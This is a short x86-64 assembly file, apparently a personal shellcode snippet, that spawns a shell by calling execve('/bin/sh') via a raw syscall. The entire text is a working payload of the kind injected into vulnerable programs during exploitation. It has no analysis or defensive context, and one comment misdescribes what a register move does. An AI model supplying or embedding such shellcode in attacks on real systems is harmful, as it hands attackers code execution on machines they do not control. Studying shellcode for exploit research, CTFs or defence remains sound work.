; asm arch=x86-64
; syntaxe intel
; asm script to get a shell with execve()
; @PyR3Q

section .text

global _start

_start:
	xor rsi, rsi
	push rsi
	mov rdi, "/bin/sh" ; string to execute the shell in sh
	push rdi ; push rdi register in the stack
	push rsp
	pop rdi ; mov "/bin/sh" in rsp register
	mov rax, 59 ; call execve() function -> 0x3b = 59 in decimal
	push rax
	cdq ; convert doubleword to quadword
	syscall
